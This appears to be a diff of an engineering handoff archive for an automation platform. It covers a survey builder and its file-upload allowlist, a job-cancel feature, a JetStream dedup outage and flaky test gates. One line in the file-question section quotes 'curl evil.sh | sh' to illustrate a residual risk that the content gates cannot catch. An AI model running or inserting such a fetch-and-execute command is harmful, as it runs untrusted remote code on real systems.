@@ -1,5 +1,653 @@
 # Handoff Document Archive
 
+## Previous session: the survey builder branch, item E, and the adversarial review
+
+**Branch `feature/survey-builder`, 9 commits, stacked on `feature/section-row-actions`
+(pushed, `17e240c`), which is stacked on `feature/job-cancel`, off `main` at `227fc9e`.**
+
+Items C and E are both done. C grew a second half the list did not have -- **a `file` survey
+question**, with the executable-content policy that has to come with it -- and E turned out to
+rest on a **structural asymmetry nobody had written down**, which is the finding to read first.
+
+### The finding: neither record covers every job
+
+This platform keeps two records of a run and they are COMPLEMENTARY, not alternative.
+
+| | runbook job | playbook job | after the broker's window |
+|---|---|---|---|
+| Run journal | per-node, rich | **none, ever** | still there |
+| Log output | 2 events per device | per-task, rich | **gone** |
+
+`engine.WithJournal` is attached in exactly two places and neither is the legacy adapter, so a
+playbook job produces zero journal rows permanently. The mirror image is that the native adapter
+publishes exactly two job-log events per dispatch, `started` and one completion summary, so
+per-task LIVE output exists only for a playbook job.
+
+Every piece of item E follows from that. The Tasks tab's empty state has to say which kind of
+job this is and where the other kind's detail lives. The Download control has to be a chooser
+resolved per record, because a fixed pair of links hands an operator an empty file about half the
+time. Done that way, every job gets exactly one useful download.
+
+There is a tempting fix in reach and it is NOT free: `internal/engine` already emits a per-node
+event field-for-field identical to `wire.JobEvent`, and `internal/adapters/native` hands the
+executor an in-process bus and drops them. That is deliberate, with a stated reason (collision
+with the job.log stream), so forwarding them is overturning a recorded decision rather than
+picking up free money. It would give native jobs real per-task live output and make a log
+download worth having for them.
+
+### Item C: the survey builder
+
+The survey was the largest read-only object in the product. Its model has been complete since
+the Templates view was built and the only way to author one was the JSON API or the database.
+It is now authored from its own section: add in the header, then edit, remove and move on each
+row, all four naming one narrowed endpoint (`PUT /templates/{id}/survey`, `set-survey`).
+
+**Reorder is what needed the one new thing.** `RowAction.Applies` took only the `Row`, which
+cannot answer "is this the first one": a Row's Cells are display strings and its ID is author
+data, so reading an ordinal out of either is parsing a label. It now takes a `RowPosition`
+(`Index`, `Count`, `First()`, `Last()`), so Move up is withheld on the first row and Move down
+on the last. Nothing implemented the old signature, so the widening cost two test call sites.
+This is the addition the previous handoff said reorder would need, and it is the shape it said
+it would be.
+
+Two doc comments had gone stale and were corrected in the same change rather than left:
+`RowAction`'s still said a row control never prompts (item B made that false), and the
+templates writer gave "the shared form machinery has no control for it" as the reason the
+survey is carried forward.
+
+### The `file` question, and the part worth reading
+
+A survey can now ask for a file. The answer is the file's own text carried as an ordinary extra
+variable, so every existing consumer reads it unchanged. It is bounded at 32 KiB (chosen
+against `decodeJSON`'s existing 64 KiB body cap, not for roundness), treated as secret, and
+proved to be text.
+
+**The content rule is an allowlist, and that is the whole design.** The first sketch was a table
+of magic numbers plus a `#!` test. A design panel killed it: a denylist fails OPEN on every
+shape nobody listed, and the named bypasses (a BOM before the shebang, UTF-16, a zip, a
+polyglot) all live in that gap. What shipped is "valid UTF-8, no NUL anywhere, no byte-order
+mark, `#!` at offset zero exactly". An ELF is refused because it carries NUL, not because
+anybody listed ELF. LESSONS_LEARNED #190.
+
+**Two gates, and the deployment's half is a live kill switch.** A file opening with an
+interpreter line needs both `PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT` on the Controller and
+`allow_program_content` on the question. The deployment's half is read at startup, threaded as a
+value, and consulted at every launch rather than at authoring time, so clearing it and
+restarting stops templates that already carry the flag. The dispatcher ASSIGNS it onto
+`launch.Config` immediately before resolving, overwriting whatever the caller put there, because
+a defaulting version lets anybody who can build a Config grant themselves the deployment's
+consent. Both properties have their own test; the assignment was proved by a negative control.
+LESSONS_LEARNED #191.
+
+**The residual risk is in the code, not only here.** This refuses a file that ANNOUNCES itself
+as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
+every test and is accepted with both gates shut. The danger lives in what the automation does
+with an answer, and a runbook may already pipe any `text` answer to a shell with no flag at all.
+The flag is named `AllowProgramContent` rather than `AllowExecutableFiles` for exactly that
+reason. What the gates buy is separation of duty. The untaken fix is a gate on what a runbook
+may DO with an answer, which is much larger work.
+
+**The launch control is a textarea, not a file picker.** Every write in this UI is parsed with
+`r.ParseForm`, which does not read a multipart body at all, so an `<input type="file">` would
+post the filename and silently blank every other control on the form. The picker is its own
+piece of work on the form pipeline (see below). What reaches the automation is identical.
+
+### Three pre-existing defects found, all verified, none fixed
+
+Each was found by a parallel sweep and then confirmed directly with `go_symbol_references` or by
+reading the code, because two of them were first reported by an agent and agents are wrong
+sometimes. They are **not** introduced by this branch.
+
+1. **`jobs.extra_vars` is plaintext.** `cmd/controller` registers crypto hooks for `Device`,
+   `SavedLaunchConfig`, `Credential` and `MeshSigningKey` only. A secret survey answer is
+   encrypted in `saved_launch_configs.answers` and in the clear in `jobs.extra_vars`, in the
+   same database. The file question makes the values flowing through it larger and more likely
+   to be key material.
+2. **A survey answer never reaches the log masker.** `wire.Injected.Mask` is built from
+   credential artifacts only, so a task that echoes a password or file answer lands it in the
+   job log unredacted. `internal/credtype/inputs.go` claimed otherwise and has been corrected.
+   Deliberately not closed by adding survey answers to `redact.Literals`: a 32 KiB literal in
+   the process-wide set would scrub enormous unrelated substrings out of every later log line.
+3. **A chunked launch silently discards its body.** `internal/api/dispatcher.go` decodes only
+   `if r.ContentLength > 0`; a chunked POST has `-1`, so every answer and override is dropped
+   and the launch returns 202 having run the template's defaults. Two sibling handlers share the
+   shape, where an empty body is legitimate. The launch one is not. One line to fix.
+
+A fourth, recorded as FAILURE_PATTERNS #228: `routing.CheckInjectable` has one production
+caller, and the UI's own credential-binding action writes straight to the store, so an env/file
+binding made through `/ui` is caught only by the run-time backstop.
+
+### Item E: the Tasks tab and Download
+
+The run journal had been WRITE-ONLY since it shipped: a table with migrations in both dialects,
+an index declared with a doc comment naming exactly this query, a subscriber the Controller
+refuses to start without, and no reader anywhere. `journal.EntStore.ForJob` is its first.
+
+Both halves of the recorded sizing were wrong. "No API endpoint exposes it" is true and
+irrelevant -- a `view.Section` reads its port directly and needs no endpoint, no `auth.LinkRel`
+and no handler, which the Device outcomes section on the same page already proved. "Download has
+no route shape to reuse" is false twice: `/{resource}/chart.json` is already a non-HTML UI route
+with its own scope check, and `/{resource}/{id}/logs` already proves a per-record static segment
+coexists with the `/{id}/{action}` wildcard.
+
+What it actually cost was the honesty work, and that produced two new seams:
+
+- **`Section.Note`**, a line resolved per RECORD rather than declared once. The journal scales as
+  devices times nodes, so the read is bounded, and a table capped at 500 rows of a longer run
+  shows a partial record looking exactly like a complete one.
+- **`view.DownloadSpec`**, a list resolved per record, with `Available` checked twice -- when the
+  control is drawn and again when the link is followed, because a log window expires in between.
+  Removing the second check made a record with nothing to give serve a 200.
+
+Two format decisions worth not re-litigating. The journal downloads as **CSV** because it is a
+flat table someone sorts and pastes into a ticket, and it carries no secret by construction. The
+log downloads as **NDJSON** rather than a JSON array, because an array needs its closing bracket
+written after the last message, which a drain that fails partway cannot do.
+
+The log download is withheld while a job is RUNNING. The subject has no end-of-stream marker, so
+a drain stops at whatever had arrived, and a file that silently ends mid-run is indistinguishable
+from a run that ended there.
+
+### The list
+
+| Item | What it is | First sized | State |
+|---|---|---|---|
+| B | Section write path, row half | S | **DONE.** Add, edit in place and remove on a credential type's inputs. |
+| C | Survey builder | S add / M edit | **DONE**, plus the `file` question type and its two gates. |
+| E | Tasks tab and Download | M | **DONE.** The journal's first reader, a Tasks tab, and a per-job download chooser. |
+| F | Users: password reset, team display | M | `internal/apispec` declares no password endpoint of any kind. No team-member port. |
+| G | Inventory Sources | M | New entity plus both dialects' migrations. D's runner and history pattern is reusable. |
+| H | Execution envs, instance groups, max hosts | L | Both UI resources exist at `view.StatusDeclared`. The heartbeat is a file, not a registration. |
+
+### Decisions left, not improvised
+
+1. **Forwarding the engine's per-node events**, described above. It would give native jobs real
+   per-task live output and make their log download worth having, and it overturns a recorded
+   decision, so it is a judgement rather than a task.
+2. **The file picker**, and it is DEARER than this document first said. The CSRF token is a
+   hidden input, which in a multipart form lives inside the body, and `h.csrf` runs before the
+   handler and reads it through `ParseForm` -- which yields nothing for a multipart body. So the
+   MIDDLEWARE has to parse the whole body before it can verify the token, and `r.MultipartReader`
+   is no escape hatch because it permanently disables `ParseMultipartForm` downstream. Add the
+   eleven other `ParseForm` sites, each of which silently blanks every control when handed a
+   multipart body today, and this is a change to the write path rather than to one handler.
+3. **A template can store an armed flag a deployment refuses.** `Survey.Validate` accepts
+   `allow_program_content` whatever the deployment says, so a template copied to a consenting
+   deployment keeps its author's intent. The authoring form withholds the checkbox where it
+   would do nothing and the Survey section's PROGRAM CONTENT column reads "refused here", but
+   the stricter reading of "don't offer choices that can only fail" would refuse the save. A
+   judgement call; the opposite call is defensible.
+4. **The three defects above.** Each is the user's to schedule. (3) is one line.
+5. Everything the previous entry left open is still open: the `running` watchdog, the
+   result-before-row ordering, the eighteen unnarrowed flaky entries, the two proposed gate
+   rules, the DLQ consumer and the dogfood pass. See `HANDOFF_ARCHIVE.md`.
+
+### Next step
+
+F, G or H, and the scouts found two of the three are not what the list says. **F**'s premise
+question is answered: this platform DOES own local auth, which
+`tests/e2e/localauth_release_gate_test.go` exercises, so the password half is real work rather
+than somebody else's. **G** is likely cheaper than "a new entity plus both dialects'
+migrations", because `internal/inventory/syncplugin` already has a real four-stage plugin
+contract with a conformance suite, and an inventory source may be little more than a stored
+configuration pointing at one. **H** is the only one nobody has re-sized.
+
+## Previous session: the outage found in item I, and item B
+
+**Branch `feature/section-row-actions`, 31 commits, off `main` at `227fc9e`, NOT pushed.**
+`feature/job-cancel` is rebased underneath it, so the two are one linear history and that branch
+is independently correct at `749c117`.
+
+The session set out to continue the work list and did. The larger result is that **item I was
+shipping a total outage, and five consecutive gate runs called it flake.** Read that first.
+
+### The outage
+
+Every job on `feature/job-cancel` hung in `running` forever, in every deployment rather than only
+in tests. The Controller stamps a dispatch with the JetStream message id `"<jobID>:<deviceID>"`;
+the Runner published that device's result under the byte-identical id. JetStream's duplicate
+window is scoped to the STREAM, not the subject, and `internal/topology` puts every subject in one
+stream, so every result collapsed onto the dispatch that had caused it.
+
+It was silent in three independent ways. A suppressed duplicate returns `PubAck{Duplicate: true}`
+with a NIL error; `internal/event` discarded that ack, so a dropped publish and a delivered one
+were the same value everywhere above it; and the WAL then acknowledged the entry, destroying the
+only retry. The selection it produced is why it read as flake: the window is `min(budget, 5m)`, so
+FAST jobs hung and jobs slower than five minutes completed.
+
+**The gate hole is the more transferable finding.** `tests/e2e` was waived per PACKAGE while its
+waiver's own prose named exactly one test. Four tests failed on this in five consecutive
+push-gate runs and every run printed `testgate: passed (warnings above)`. The previous session's
+handoff recorded, truthfully and misleadingly, that both test phases passed. FAILURE_PATTERNS #222
+and #224, LESSONS_LEARNED #185 and #186.
+
+### What was fixed, and what each one cost to find
+
+1. **The message-id collision** (`b119578`). One line, plus the log line that would have made it
+   visible on day one, plus the real-broker test whose absence let it ship: both existing dedup
+   tests published to a SINGLE topic, so both were equally consistent with per-subject and
+   per-stream dedup, and they passed beside three comments asserting the wrong model.
+2. **A second permanent hang** (`bbeb891`), masked by the first. A job whose devices all reported
+   before its fan-out finished was parked in `running` with nothing left to end it.
+3. **The flake gate** (`749c117`). An entry may now name its tests and then tolerates only those.
+4. **The e2e harness** (`65b2d55`). It decoded every poll into one reused value, so an `omitempty`
+   field plus an unordered array put one device's skip reason on another device's row; three
+   investigations blamed the fan-out. It also asserted nothing the Runner reported, which is the
+   capability this branch exists to add.
+5. **A task list that reshuffled between identical reads** (`b697279`).
+6. Item B's own three, recorded as FAILURE_PATTERNS #219, #220 and #221.
+
+### The list this is working through
+
+| Item | What it is | First sized | State |
+|---|---|---|---|
+| B | Section write path, row half | S | **DONE.** Both halves. Add, edit in place and remove on a credential type's inputs. |
+| C | Survey builder | S add / M edit | **NEXT.** Model is complete and persisted, UI is read-only. The seam its edit half waited on now exists; only reorder needs anything new. |
+| E | Tasks tab and Download | M | `internal/journal` is real and no API endpoint exposes it. Download has no route shape to reuse. |
+| F | Users: password reset, team display | M | `internal/apispec` declares no password endpoint of any kind. No team-member port. |
+| G | Inventory Sources | M | New entity plus both dialects' migrations. D's runner and history pattern is reusable. |
+| H | Execution envs, instance groups, max hosts | L | Both UI resources exist at `view.StatusDeclared`. The heartbeat is a file, not a registration. |
+
+### Item B: DONE, both halves
+
+`view.RowAction`, declared on a Section and addressed at `/{resource}/{id}/{action}/{row}`. A row
+control can act at once (Remove) or prompt (Edit), and the credential type is the consumer that
+proves it: an input can be added, edited in place and removed, where both tabs were one-way doors
+whose only route back was the JSON API or the database.
+
+**Prompting and prefilling are ONE decision, enforced at registration** rather than tested for. A
+row action declaring `Fields` must declare `Form`. A prompt with no prefill renders the row's
+current values as empty boxes and blanks whichever the operator does not retype, which is the
+exact failure the seam exists to remove, so the combination is refused outright.
+
+**A row prompt is an edit form and a record prompt is not, with no new mode flag.** `ActionModel`
+carries the row, and a form has a row exactly when it edits something that already exists.
+`Immutable` then means what it means everywhere else, so ONE field slice serves the add form and
+the edit form: the control naming the row is offered by the first and withheld by the second.
+
+**The seam found two live bugs before it had a consumer**, FAILURE_PATTERNS #226 and #227, and
+the first is the one to read. `bindCredentialsAction` resolved a template's bound credentials,
+sorted them, and dropped them, because there was nowhere to put a form value. The multi-select
+rendered with nothing selected on a template bound to three credentials, and pressing the button
+as drawn replaced those three with none: the template silently stopped authenticating as
+anything. A variable built with care and never read is a question, not dead code.
+
+**Item C's edit half no longer waits on anything.** A survey question's edit and its delete land
+directly on this. Reorder needs one addition: `RowAction.Applies` sees only the Row, and "Move up"
+on the first row is a control that can only fail, so it needs the row's position. That was
+deliberately not added speculatively, because the shape of reorder is not yet known.
+
+### Where the gate stands
+
+`make ci` was run to completion. `build`, `vet`, `fmt`, `tidy-check`, `test-race`, `test-repeat`,
+`test-integration`, `gosec` and `govulncheck` all pass, and `tests/e2e` is clean. `docs-lint`,
+`docs-gen-check`, `helm-lint` and `templ-gen-check` were run separately and pass, because `make`
+stops at its first failure and would otherwise have left them unobserved.
+
+`coverage` did not pass, and the reason is environmental rather than a coverage question:
+`coverage-check` runs its own fourth full parallel `go test ./...` and bails before measuring
+anything if that pass has a failure. It was run three times. Each time it failed, and each time
+it failed on a DIFFERENT set of packages with no overlap between them:
+
+| run | packages that failed |
+|---|---|
+| inside `make ci` | `cmd/runner`, `internal/lock`, `internal/topology` (two) |
+| standalone | `cmd/controller`, `internal/ent` (twelve, all one shared postgres container), `internal/meshid`, `internal/topology` (two) |
+| standalone, after the daemon had settled | `cmd/pleiades`, `cmd/runner` (two), `internal/topology` |
+
+"The specific package that loses the race changes between runs" is verbatim what
+`flaky-packages.json` cites as the signature of resource contention, and every failure is a
+container that would not come up: `connection refused` to an already-mapped port, or in the worst
+run a `context deadline exceeded` against the Docker SOCKET after 537 retries, which is the
+daemon itself saturating rather than any container. Samples from each run were rerun in
+isolation and pass, in 0.66s to 7.8s against 11s to 61s of retrying under load.
+
+**That comparison is the discriminator this session exists to teach**, and it is worth stating
+next to the thing it is being compared with. The e2e failures looked the same and were not: the
+same four tests, five runs out of five, failing identically at exactly the poll budget. Different
+packages each run is contention. The same packages every run is a defect.
+
+So the coverage ratchet has not been measured on this branch, and no floor has been checked.
+Nothing suggests a regression, and nothing has verified its absence either.
+
+### Decisions left, not improvised
+
+1. **A `running` job has no watchdog.** A single lost result is still an unrecoverable hang with
+   no log line anywhere. `dispatch.Reaper` sweeps `fanning_out` only. The two known ways to lose
+   a result are fixed; the class is not closed.
+2. **A result can beat its own task row.** `worker_devices.go` publishes the dispatch before
+   writing the row, so a result arriving in between hits `RecordResult`'s not-found path, which
+   warns and ACKs, destroying the outcome permanently. Writing the row first would close it, but
+   `worker.go`'s cancel path already reasons from the current ordering, so it is a deliberate
+   decision rather than a swap.
+3. **Eighteen flaky-packages entries are still unnarrowed.** Narrowing each is real work against
+   real evidence, not a mechanical edit.
+4. **Two further gate rules were proposed and not taken.** Never tolerate a package-level kill
+   (a hang is not contention, though this repo has recorded a hang that genuinely was one), and
+   re-run a warned test in isolation and escalate if it fails again. The second is the rule that
+   would have caught this outage, and it changes the gate's wall-clock.
+5. Everything the parked job-cancel branch left open is still open, including the dead-letter
+   consumer and the dogfood pass. See the entry below this one in `HANDOFF_ARCHIVE.md`.
+
+### Next step
+
+Item C, the survey builder. Add, edit and delete a question all land on the seam that now exists;
+reorder needs `RowAction.Applies` to see the row's position.
+
+### One thing this machine cannot currently verify
+
+`make ci` was run three times today and its remaining red is the Docker daemon rather than the
+diff. The last run's only failure was `tests/e2e`: one postgres container failed to start against
+`/var/run/docker.sock` after 560 retries, and `goleak` then failed ELEVEN unrelated tests in the
+same package on the testcontainers reaper goroutine the failed setup left behind. Every one
+passes in isolation, and the cascade is the shape `flaky-packages.json`'s own
+`internal/transport/ssh` entry already describes.
+
+Two things follow. The goleak cascade is a diagnostic defect worth its own look: one provisioning
+failure produces eleven whose message, "found unexpected goroutines", names neither the container
+nor the cause. And the narrowed `tests/e2e` waiver correctly made these HARD rather than warning,
+which is the rule working as intended: a test nobody has seen flake before should stop the gate
+and make a human look. A human looked. It was the daemon.
+
+## Previous session: the work list, and item B before the outage was found
+
+**Two things are live at once.** `feature/job-cancel` is finished and parked, and the work
+list it came off is being continued. Read both halves before touching either.
+
+### Parked: `feature/job-cancel`, 17 commits, off `main` at `227fc9e`, NOT pushed
+
+Item I, job cancel, built end to end, plus the `running` job state and the result
+aggregation that state had to stand on. `make push-gate` was run to completion and both
+test phases pass. The only red is two AWS coverage floors that fall because
+`LOCALSTACK_AUTH_TOKEN` is unset, and neither package is touched by the branch.
+
+The full writeup is the top entry of `HANDOFF_ARCHIVE.md`: the two corrections to the
+plan's own sizing, the subscription bug the branch's own test found before it shipped, and
+the gate blind spot that `tools/coverage-check` cannot tell a skipped test from an untested
+package. Five things were left as decisions rather than improvised, and they are what a
+return to this branch is for:
+
+1. A dogfood pass, which the suite cannot substitute for (LESSONS_LEARNED #174).
+2. The legacy container adapter's cancellation is unverified. The native SSH path is proven.
+3. A job can now get stuck in `running`, and nothing reaps it. The one gap this work
+   introduces rather than inherits.
+4. Nothing consumes dead letters, which is FAILURE_PATTERNS #217's shape a second time.
+5. A job whose every device failed still ends `completed`. Inherited rather than
+   introduced, and decidable now that per-device results exist.
+
+The branch is a clean fast-forward from `main` and awaits a push and PR decision.
+
+### The list this is working through, and where each item actually stands
+
+This list has lived only in conversation until now, which is why an item's stated size has
+twice turned out to be wrong in a way nothing recorded. Each row below carries what was
+first claimed and what the code says today, with the anchor that settles it.
+
+| Item | What it is | First sized | Verified state |
+|---|---|---|---|
+| B | Section write path, row half | S | Row half BUILT on `feature/section-row-actions`, with the credential type as its consumer. The edit-in-place half waits on form prefill. |
+| C | Survey builder | S add / M edit | Model is complete and persisted. UI is read-only. The edit half needs B, which the first note had backwards. |
+| E | Tasks tab and Download | M | `internal/journal` is real and no API endpoint exposes it. Download has no route shape to reuse. |
+| F | Users: password reset, team display | M | `internal/apispec` declares no password endpoint of any kind. No team-member port. |
+| G | Inventory Sources | M | New entity plus both dialects' migrations. D's runner and history pattern is reusable. |
+| H | Execution envs, instance groups, max hosts | L | Both UI resources exist at `view.StatusDeclared`. The heartbeat is a file, not a registration. |
+
+**B, in detail, because it is next.** `view.Section` already carries `Actions []string`: a
+section names one of its parent record's `RecordAction`s and renders a button that acts on
+the record, which is how "Add input" reaches a credential type
+(`internal/ui/resources/credentialtypes/inputs.go`). There is no equivalent for a row of
+that section, so an input can be added to a credential type and then never removed, and the
+same is true of an injector and of a survey question. Removing needs no form at all and is
+the shippable half. Editing in place needs a `RecordAction` whose form can be prefilled from
+an existing row, which is a `view` package change rather than a resource one, and is the
+real blocker the original note was pointing at.
+
+**C's dependency is the opposite of what was recorded.** The first note said the survey
+builder "needs A's endpoint and relation pattern, not B". That is true of adding a question
+and false of editing one: `launch.Survey` holds an ordered list of questions, so editing,
+reordering and deleting one are all row operations and all wait on B.
+
+**E grew rather than shrank.** The journal half is a query against a real package. The
+Download half has nowhere to live: the only per-record route beyond the resource's own is
+`/{resource}/{id}/logs`, fixed once for every resource that declares a `StreamSpec`
+(`internal/ui/view/view.go`). A download is a second such route or an API endpoint, and
+which one it should be is a decision rather than a detail.
+
+### Item B: the row half, built on `feature/section-row-actions`
+
+Branched off `feature/job-cancel` rather than `main`, deliberately: that branch is finished and
+waiting on a PR decision, not in progress, and stacking keeps the handoff linear instead of
+guaranteeing a conflict in this file. It rebases onto `main` trivially if job cancel merges first.
+
+**What it adds.** `view.RowAction`, declared on a Section and addressed at
+`/{resource}/{id}/{action}/{row}`. Its `Submit` takes both ids and no `Values`. The consumer is
+the credential type: an input and an injector can now be taken back out, where before both tabs
+were one-way doors and the only route back was the JSON API or the database.
+
+**What it deliberately does not add, which is the rest of item B.** A row action does not prompt.
+Removing a row needs no form; EDITING one needs a form prefilled from that row, and
+`RecordAction`'s own doc comment records that its form prefills nothing. Building a prompt before
+that seam exists would render a row's current values as empty boxes and silently blank whichever
+the operator did not retype. **That seam is what item C's edit half waits on too**, so it is worth
+doing next and worth doing once.
+
+**Three defects found, all of them live rather than theoretical**, recorded as FAILURE_PATTERNS
+#219, #220 and #221. The one worth knowing about without opening the archive is #220: a row
+control's relation was missing from `Descriptor.Candidates`, so the authorization generator was
+never asked about it, it was never permitted, and every such control was withheld from everybody
+including an administrator. That failure is invisible by construction, because a withheld control
+and an absent one are the same rendering. LESSONS_LEARNED #183 is the rule.
+
+**One thing is stated rather than prevented, and it is a decision rather than a detail.** Removing
+an input that credentials of the type already store a value for leaves those credentials
+unsaveable: `CheckValues` refuses a stored value naming an input the type no longer declares. The
+confirmation says so. It is NOT introduced here, because adding a *required* input to an in-use
+type already strands them the same way, and one guard answers both: should `UpdateType` refuse a
+schema change that would strand existing credentials, the way `DeleteType` already refuses a
+delete with a count? AWX refuses to modify a credential type that is in use at all, which is the
+stricter answer and the one worth arguing about.
+
+### Next step
+
+The action-form prefill seam, which finishes item B and unblocks item C's edit half.
+
+## Previous session: item I, job cancel (branch `feature/job-cancel`, parked unpushed)
+
+**Branch `feature/job-cancel`, off `main` at `227fc9e` (the merge of PR #31). Item I, job
+cancel, built end to end, plus the `running` job state and the result aggregation that state
+had to stand on. Seven commits, NOT pushed.** Nothing is blocked.
+
+### What a cancel now does, and what it honestly does not
+
+Two halves with different guarantees, and the difference is stated in the endpoint
+description, the UI and the commit messages rather than glossed over.
+
+- **Authoritative:** the record and the fan-out. `JobStore.Cancel` is a compare-and-swap out
+  of `pending`/`fanning_out`/`running` into `canceled`, stamping `canceled_at`/`canceled_by`.
+  The fan-out loop learns of it because `RecordTask` refuses a canceled job, on a row it had
+  already read for the fence, so it costs no extra query on a ten thousand device loop.
+- **Best effort:** work already running on a device. A per-job core-NATS control subject
+  reaches whichever Runner holds the job and cancels the `execCtx` `executeWithLease` already
+  builds. Gated on `payload.Interruptible` exactly like the two existing abort triggers, so an
+  un-abortable task finishes, per PLAN.md Section 16.
+
+One device can still be dispatched to after a cancel lands, because the publish precedes the
+`RecordTask` that refuses. The window is inherent rather than open: a cancel can arrive between
+any publish and its write. The test asserts the overshoot at exactly one device.
+
+### Two corrections to the plan's own sizing, both verified
+
+- **There was no SQLite table rebuild.** Neither dialect constrains `jobs.state`; the enum is
+  a Go-side validator. Widening it needed no DDL, and the migration carries only new columns.
+- **`running` was the expensive half, not cancel.** Nothing consumed
+  `pleiades.jobs.results.>`, and the Runner only published onto it when `RUNNER_WAL_DIR` was
+  set. See FAILURE_PATTERNS #217.
+
+### The bug worth not re-learning
+
+`SubscribeCancel` returned before the broker had registered the subscription. A cancel is a
+core publish with no queue, so one arriving in that window was dropped forever rather than
+delivered late, and the window sat across the start of a run. FAILURE_PATTERNS #216,
+LESSONS_LEARNED #181. The thing that corrected a wrong "it is just container flake" diagnosis
+was RAISING the deadline: it then failed identically at thirty seconds.
+
+### Where it stands
+
+`make push-gate` was run to completion. Both test phases pass: the `-race` pass and the
+integration pass each report passed, with their only failures confined to packages
+`flaky-packages.json` already names and each warned rather than blocking.
+
+**The one remaining blocker is environmental and cannot be fixed from the code.**
+`coverage-check` reports two regressions, `internal/catalog/cloud/aws/ec2` at 49.2% against a
+96.7% floor and `internal/catalog/cloud/aws/s3` at 48.0% against 98.0%. Both packages skip
+their LocalStack-backed tests when `LOCALSTACK_AUTH_TOKEN` is unset, which accounts for the
+whole of each drop; neither is touched by this branch. Set the token and they should return to
+their floors.
+
+That exposes a real gap in the gate itself, worth a decision separately from this work.
+`tools/testgate` learned to tell "the test failed because its infrastructure was not there"
+apart from "the test failed", which is what `flaky-packages.json` is. `tools/coverage-check`
+never learned the equivalent distinction: it reads a percentage and nothing else, so a package
+whose tests all skipped for want of a token is indistinguishable from one that is genuinely
+untested. Until it can tell those apart, any environment without every piece of optional
+infrastructure fails the ratchet for reasons that have nothing to do with the diff.
+
+Negative controls were run for the assertions most worth doubting, and each fails when its
+guard is removed: the fence-beats-canceled ordering, the fan-out stopping on a cancel, the
+`interruptible: false` gate, the three HTTP client properties, and the result consumer's
+subject.
+
+### Next steps
+
+1. A dogfood pass. The suite cannot substitute for it (LESSONS_LEARNED #174): launch a real
+   job against a multi-device group, cancel it mid-fan-out, and confirm the remaining devices
+   were never dispatched, the record page stops polling, and the badge reads canceled.
+2. The legacy container adapter's cancellation was not verified. `internal/adapters/native`'s
+   path is proven to tear down an in-flight SSH command (`pkg/remoteexec/conn.go` closes the
+   session out from under `ssh.Session.Run`); whether cancelling the legacy adapter's `runCtx`
+   actually stops a running container is unchecked, so a playbook job's cancel may reach the
+   Runner and not the work.
+3. **A job can now get stuck in `running`, and nothing reaps it.** This is the one real
+   gap this work introduces rather than inherits. A job leaves `running` only when every
+   dispatched device reports, so a dispatch that is dead-lettered after exhausting
+   `MaxDeliver` produces a result that never arrives and a job that waits forever. The
+   ordinary Runner death self-heals, because JetStream redelivers the dispatch to another
+   Runner after `AckWait` and that one reports; it is exhaustion, not a single crash, that
+   strands a job. `dispatch.Reaper` does not cover it: it looks only at `fanning_out`
+   (`ListStaleFanOuts`), which is correct for what it was built for and means a `running` job
+   is invisible to it. The shape of a fix already exists in that reaper, a leader-gated sweep
+   over jobs whose `updated_at` is older than a bound, and the honest question to answer
+   first is what a stranded job should become: `failed` naming the devices that never
+   reported is the obvious answer, and it should not be `completed`.
+4. **Nothing consumes dead letters, which is FAILURE_PATTERNS #217's shape a second time.**
+   Found by sweeping every subject `internal/topology` declares for a subscriber, which is the
+   check that finding should have left behind. `event.HandleDeliveryFailure` publishes to
+   `topology.DeadLetterSubject(...)` (`internal/event/dlq.go`), and no consumer exists anywhere
+   in the module; the grants carry publish rights and no subscribe. So a message that exhausted
+   `MaxDeliverDefault` redeliveries, a job that could never be fanned out or a journal batch the
+   store keeps refusing, lands on a subject nobody reads and is gone at `MaxAge`. Nothing
+   alerts. `topology.go`'s own comment describes "one operator-facing consumer" watching all of
+   them with a trailing wildcard, which is aspirational in the way the result subject's was
+   until this session. Left as a decision rather than improvised: where a dead letter should
+   land and who is told are product questions, and the answer is probably a durable consumer
+   writing to a table the UI can show, next to the run journal.
+5. A job whose every device's run failed still ends in `completed` with the tallies telling the
+   story. That is unchanged from before this work rather than introduced by it, and it is worth
+   a decision now that per-device results exist to base one on.
+
+## Previous session: the UI revamp branch (merged as PR #31)
+
+**Branch `feature/ui-revamp`, off `main` at the merge of PR #30 (Phase 40). A web UI pass:
+page anatomy, accessibility mode, AWX tab parity, a declared system settings area, and
+structural fixes to the Las Ventanas skin. Three commits, NOT pushed. One design question
+is open and is the reason it was not.** No Phase 40 code was touched.
+
+### The open question, and why the branch stopped here
+
+**A runbook has no Run button, and cannot simply be given one.** A dispatch needs an
+inventory; a runbook names none; `Dispatcher.LaunchTemplate` and `Dispatcher.Relaunch` are
+the only launch paths that exist, and both are keyed on a template. So "Run this runbook"
+is one of three things, and which one is a product decision rather than an implementation
+detail:
+
+1. **Run creates a template, then launches it.** Buildable today with existing ports.
+   Every ad-hoc run leaves a permanent template behind, so the Templates list fills with
+   one-offs.
+2. **A real ad-hoc dispatch path.** New `Dispatcher` surface, a new endpoint and scope.
+   Cleanest for the operator, and it bypasses the declared field bounds that are the
+   reason templates exist as a security boundary.
+3. **No Run button.** What is built now: a Templates tab on the runbook listing what
+   already runs it, one click to that template's Launch. This is what AWX does, where a
+   playbook is never dispatched directly either.
+
+Nothing else is blocked on this.
+
+### What was built
+
+**One shared chrome, table and zero state.** `view.Chrome` (`internal/ui/view/chrome.go`)
+carries breadcrumb, title, status badge, actions and tabs, built by all six page models and
+rendered by one component holding no decisions. `view.TableModel` and `view.ZeroState`
+(`table.go`) replaced three near-identical table copies and four renderings of "nothing
+here". The section copy had no reference links, which is why three drill-downs were dead
+ends. See LESSONS_LEARNED #176.
+
+**Records have tabs**, addressed by `?tab=`, computed from the `Sections` and `Stream` a
+descriptor already declares. `Descriptor.DefaultTab` lets a view name its landing tab; Jobs
+opens on Live output. A lone Details tab renders no strip: one tab is not a tab strip.
+
+**Status badges and record titles are declared, not inferred.** `Descriptor.NameField` and
+`Descriptor.StatusBadgeField`. Inferring the status from the first listed badge field was
+wrong nearly everywhere it applied: a failed job was headed "4821 runbook" and every runbook
+record was headed "YES". Only `jobs`, `devices` and `templates` declare a status.
+
+**Accessibility mode is a mode.** Named that everywhere,
+`AccountModel.AccessibilityEffects` enumerates all five things it does, and `/a11y`,
+`/theme` and `/skin` left the session gate for a group using the new `preferenceCSRF`.
+Signed out, the toggle is the first focusable element on the document. See
+LESSONS_LEARNED #178.
+
+**Appearance moved to a Preferences page** (renamed from Settings, which the deployment's
+own configuration needed: LESSONS_LEARNED #179). Preference changes return the reader to
